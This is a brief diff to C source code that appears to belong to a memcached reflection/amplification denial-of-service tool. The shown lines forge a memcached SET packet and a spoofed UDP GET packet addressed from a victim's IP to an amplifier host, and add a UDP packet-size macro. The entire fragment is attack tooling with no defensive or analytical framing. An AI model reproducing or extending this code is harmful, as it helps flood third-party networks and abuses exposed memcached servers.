@@ -12,6 +12,7 @@
 #define SIGNAL_ERROR 2
 
 #define GetPort( port ) ( port > 0 ) ? port : MEMCACHED_DEFAULT_PORT
+#define UDPPacketSize( payload_size ) ( IP_HEADER_SIZE + UDP_HEADER_SIZE + payload_size )
 
 void memcachedSetValue( AttackPlan * p_atkData )
 {
@@ -43,7 +44,7 @@ static AttackPlan * createAttackDataGETSET( LhfDraft *p_draft )
 
     memalloc( (void *)&newData, sizeof( AttackPlan ) );
     arg = MEMCACHED_SET;
-    newData->setPacket = ForgeTCP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedBinary, &arg );
+    newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeMemcachedBinary, &arg );
     arg = MEMCACHED_GET;
     newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
     newData->draft = p_draft;
